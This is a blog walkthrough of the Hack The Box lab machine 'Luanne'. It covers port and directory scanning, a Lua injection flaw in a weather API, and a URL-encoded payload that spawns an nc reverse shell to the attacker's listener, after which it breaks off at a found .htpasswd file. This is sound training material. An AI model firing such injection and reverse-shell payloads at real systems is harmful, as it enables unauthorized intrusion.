@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 OtherDifficulty:	EasyPoints:	20Release:	28 Nov 2020IP:	10.10.10.218">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[luanne]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/12/04/luanne/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 OtherDifficulty:	EasyPoints:	20Release:	28 Nov 2020IP:	10.10.10.218">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb130.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb131.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb132.jpg">
+<meta property="article:published_time" content="2020-12-04T06:18:31.000Z">
+<meta property="article:modified_time" content="2021-03-29T13:05:55.138Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb130.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/12/04/luanne/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/12/04/luanne/","path":"2020/12/04/luanne/","title":"Hack-The-Box-walkthrough[luanne]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[luanne] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">4.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">4.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/12/04/luanne/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[luanne] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[luanne]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-12-04 14:18:31" itemprop="dateCreated datePublished" datetime="2020-12-04T14:18:31+08:00">2020-12-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-03-29 21:05:55" itemprop="dateModified" datetime="2021-03-29T21:05:55+08:00">2021-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Other<br>Difficulty:	Easy<br>Points:	20<br>Release:	28 Nov 2020<br>IP:	10.10.10.218</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb130.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.218</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx 1.19.0</span><br><span class="line">9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)</span><br><span class="line">Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># nmap -sV -sC -v -p 22,80,9001 10.10.10.218</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)</span><br><span class="line">|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)</span><br><span class="line">|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.19.0</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=.</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/weather</span><br><span class="line">|_http-server-header: nginx/1.19.0</span><br><span class="line">|_http-title: 401 Unauthorized</span><br><span class="line">9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=default</span><br><span class="line">|_http-server-header: Medusa/1.12</span><br><span class="line">|_http-title: Error response</span><br><span class="line">Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>They asking us for a username and Password.</p>
+<p>If we see in our nmap result they tell us about robots.txt.</p>
+<p>Let’s check out that quickly</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /weather  <span class="comment">#returning 404 but still harvesting cities </span></span><br></pre></td></tr></table></figure>
+
+<p>There is a one directory called &#x2F;weather in the disallow entries.</p>
+<p>Let’s check that directory.</p>
+<p>Hmm they said 404 not found.</p>
+<p>Let’s use gobuster to find inside &#x2F;weather directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># gobuster dir -u http://10.10.10.218/weather/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.218/weather/</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/12/04 01:40:43 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/forecast (Status: 200)</span><br></pre></td></tr></table></figure>
+
+<p>they found one more interesting directory called &#x2F;forecast</p>
+<p>They said no city specified use city&#x3D;list.</p>
+<p>Let’s use this in the url.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.218/weather/forecast?city=list</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>: 200,<span class="string">&quot;cities&quot;</span>: [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Manchester&quot;</span>,<span class="string">&quot;Birmingham&quot;</span>,<span class="string">&quot;Leeds&quot;</span>,<span class="string">&quot;Glasgow&quot;</span>,<span class="string">&quot;Southampton&quot;</span>,<span class="string">&quot;Liverpool&quot;</span>,<span class="string">&quot;Newcastle&quot;</span>,<span class="string">&quot;Nottingham&quot;</span>,<span class="string">&quot;Sheffield&quot;</span>,<span class="string">&quot;Bristol&quot;</span>,<span class="string">&quot;Belfast&quot;</span>,<span class="string">&quot;Leicester&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>They list all cities Let’s choose Leeds.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.218/weather/forecast?city=Leeds</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>: 200,<span class="string">&quot;city&quot;</span>: <span class="string">&quot;Leeds&quot;</span>,<span class="string">&quot;list&quot;</span>: [&#123;<span class="string">&quot;date&quot;</span>: <span class="string">&quot;2020-12-04&quot;</span>,<span class="string">&quot;weather&quot;</span>: &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;snowy&quot;</span>,<span class="string">&quot;temperature&quot;</span>: &#123;<span class="string">&quot;min&quot;</span>: <span class="string">&quot;12&quot;</span>,<span class="string">&quot;max&quot;</span>: <span class="string">&quot;46&quot;</span>&#125;,<span class="string">&quot;pressure&quot;</span>: <span class="string">&quot;1799&quot;</span>,<span class="string">&quot;humidity&quot;</span>: <span class="string">&quot;92&quot;</span>,<span class="string">&quot;wind&quot;</span>: &#123;<span class="string">&quot;speed&quot;</span>: <span class="string">&quot;2.1975513692014&quot;</span>,<span class="string">&quot;degree&quot;</span>: <span class="string">&quot;102.76822959445&quot;</span>&#125;&#125;&#125;,&#123;<span class="string">&quot;date&quot;</span>: <span class="string">&quot;2020-12-05&quot;</span>,<span class="string">&quot;weather&quot;</span>: &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;partially cloudy&quot;</span>,<span class="string">&quot;temperature&quot;</span>: &#123;<span class="string">&quot;min&quot;</span>: <span class="string">&quot;15&quot;</span>,<span class="string">&quot;max&quot;</span>: <span class="string">&quot;43&quot;</span>&#125;,<span class="string">&quot;pressure&quot;</span>: <span class="string">&quot;1365&quot;</span>,<span class="string">&quot;humidity&quot;</span>: <span class="string">&quot;51&quot;</span>,<span class="string">&quot;wind&quot;</span>: &#123;<span class="string">&quot;speed&quot;</span>: <span class="string">&quot;4.9522297247313&quot;</span>,<span class="string">&quot;degree&quot;</span>: <span class="string">&quot;262.63571172766&quot;</span>&#125;&#125;&#125;,&#123;<span class="string">&quot;date&quot;</span>: <span class="string">&quot;2020-12-06&quot;</span>,<span class="string">&quot;weather&quot;</span>: &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;sunny&quot;</span>,<span class="string">&quot;temperature&quot;</span>: &#123;<span class="string">&quot;min&quot;</span>: <span class="string">&quot;19&quot;</span>,<span class="string">&quot;max&quot;</span>: <span class="string">&quot;30&quot;</span>&#125;,<span class="string">&quot;pressure&quot;</span>: <span class="string">&quot;1243&quot;</span>,<span class="string">&quot;humidity&quot;</span>: <span class="string">&quot;13&quot;</span>,<span class="string">&quot;wind&quot;</span>: &#123;<span class="string">&quot;speed&quot;</span>: <span class="string">&quot;1.8041767538525&quot;</span>,<span class="string">&quot;degree&quot;</span>: <span class="string">&quot;48.400944394059&quot;</span>&#125;&#125;&#125;,&#123;<span class="string">&quot;date&quot;</span>: <span class="string">&quot;2020-12-07&quot;</span>,<span class="string">&quot;weather&quot;</span>: &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;sunny&quot;</span>,<span class="string">&quot;temperature&quot;</span>: &#123;<span class="string">&quot;min&quot;</span>: <span class="string">&quot;30&quot;</span>,<span class="string">&quot;max&quot;</span>: <span class="string">&quot;34&quot;</span>&#125;,<span class="string">&quot;pressure&quot;</span>: <span class="string">&quot;1513&quot;</span>,<span class="string">&quot;humidity&quot;</span>: <span class="string">&quot;84&quot;</span>,<span class="string">&quot;wind&quot;</span>: &#123;<span class="string">&quot;speed&quot;</span>: <span class="string">&quot;2.6126398323104&quot;</span>,<span class="string">&quot;degree&quot;</span>: <span class="string">&quot;191.63755226741&quot;</span>&#125;&#125;&#125;,&#123;<span class="string">&quot;date&quot;</span>: <span class="string">&quot;2020-12-08&quot;</span>,<span class="string">&quot;weather&quot;</span>: &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;partially cloudy&quot;</span>,<span class="string">&quot;temperature&quot;</span>: &#123;<span class="string">&quot;min&quot;</span>: <span class="string">&quot;30&quot;</span>,<span class="string">&quot;max&quot;</span>: <span class="string">&quot;36&quot;</span>&#125;,<span class="string">&quot;pressure&quot;</span>: <span class="string">&quot;1772&quot;</span>,<span class="string">&quot;humidity&quot;</span>: <span class="string">&quot;53&quot;</span>,<span class="string">&quot;wind&quot;</span>: &#123;<span class="string">&quot;speed&quot;</span>: <span class="string">&quot;2.7699138359167&quot;</span>,<span class="string">&quot;degree&quot;</span>: <span class="string">&quot;104.89152945159&quot;</span>&#125;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Nothing interesting in the output.</p>
+<p>After some hit and try and reading the hackthebox forums they all talking about lua. i think lua is related to the machiene name.</p>
+<p>Let’s try some lua syntax.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.218/weather/forecast?city=Leeds%22);%27print(</span><br></pre></td></tr></table></figure>
+
+<p>They give us a error called:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value</span><br></pre></td></tr></table></figure>
+
+<p>Now i am conform that we get the reverse shell with lua.</p>
+<ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvbHVhLw==">gtfobins-lua<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9wdWJzLm9wZW5ncm91cC5vcmcvb25saW5lcHVicy8wMDk2OTUzOTkvZnVuY3Rpb25zL21rZmlmby5odG1s">mkfifo<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>After reading some article i create a syntax for reverse shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.218/weather/forecast?city=Leeds<span class="string">&#x27;);os.execute(&quot;rm /tmp/f;mkfifo /tmp/luci;cat /tmp/luci|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9001 &gt;/tmp/luci&quot;)--</span></span><br></pre></td></tr></table></figure>
+
+<p>Url encode this to the following</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.218/weather/forecast?city=Leeds%27%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%6c%75%63%69%3b%63%61%74%20%2f%74%6d%70%2f%6c%75%63%69%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%20%39%30%30%31%20%3e%2f%74%6d%70%2f%6c%75%63%69%22%29%2d%2d</span><br></pre></td></tr></table></figure>
+
+<p>Open your netcat listner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/luanne]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001                                                                                                </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.218.</span><br><span class="line">Ncat: Connection from 10.10.10.218:65489.</span><br><span class="line">sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">_httpd</span></span><br></pre></td></tr></table></figure>
+
+<p>Boom we got the reverse shell through _httpd.</p>
+<p>After some enumeration i find an interesting file called .htpasswd in &#x2F;var&#x2F;www&#x2F;</p>
